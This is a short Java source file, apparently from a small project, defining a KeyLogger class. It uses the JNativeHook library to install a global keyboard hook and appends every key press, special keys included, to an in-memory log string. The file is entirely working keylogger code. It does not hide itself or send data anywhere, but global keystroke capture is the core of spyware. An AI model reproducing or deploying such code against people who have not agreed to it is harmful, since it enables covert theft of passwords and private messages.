package model.program;

import java.io.IOException;
import java.io.OutputStream;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

    private String Log;

    public KeyLogger() {
        this.Log = "";
    }
    public void startKeyLogger() {
        try {
            GlobalScreen.registerNativeHook();
        } catch (NativeHookException e) {
            System.exit(0);
        }
        GlobalScreen.addNativeKeyListener(this);
    }

    @Override
    public void nativeKeyTyped(NativeKeyEvent e) {

    }

    // Al presionar una tecla, debiese actualizar el log de texto.
    @Override
    public void nativeKeyPressed(NativeKeyEvent e) {
        String key = NativeKeyEvent.getKeyText(e.getKeyCode());

        if(key.length() != 1) {
            this.Log += "[" + key + "]";
        } else {
            this.Log += key;
        }

    }

    @Override
    public void nativeKeyReleased(NativeKeyEvent e) {

    }



    public void resetLog() {
        setLog("");
    }

    public String getLog() {
        return this.Log;
    }

    public void setLog(String log) {
        this.Log = log;
    }

}